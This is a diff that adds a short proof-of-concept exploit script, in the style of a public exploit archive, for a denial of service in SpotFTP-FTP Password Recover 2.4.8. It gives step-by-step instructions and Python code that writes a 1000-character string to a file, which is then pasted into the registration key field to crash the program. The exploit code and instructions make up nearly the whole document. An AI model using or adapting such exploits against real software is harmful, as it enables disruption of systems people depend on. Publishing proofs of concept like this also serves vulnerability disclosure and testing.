@@ -1,0 +1,27 @@
+# Exploit Title: SpotFTP-FTP Password Recover 2.4.8 - Denial of Service (PoC)
+# Date: 2020-24-02
+# Exploit Author: Ismael Nava
+# Vendor Homepage: http://www.nsauditor.com/
+# Software Link: http://www.nsauditor.com/spotftp.html
+# Version: 2.4.8
+# Tested on: Windows 10 Home x64
+# CVE : n/a
+
+#STEPS
+# Open the program SpotFTP-FTP Password Recover
+# Run the python exploit script, it will create a new .txt files
+# Copy the content of the file "RandomLetter.txt"
+# Click in the  Enter Registration Code
+# In the field Key put the content of the file "RandomLetter.txt"
+# End :)
+
+buffer = 'Z' * 1000
+
+try: 
+    file = open("RandomLetter.txt","w")
+    file.write(buffer)
+    file.close()
+
+    print("Archive ready")
+except:
+    print("Archive no ready")
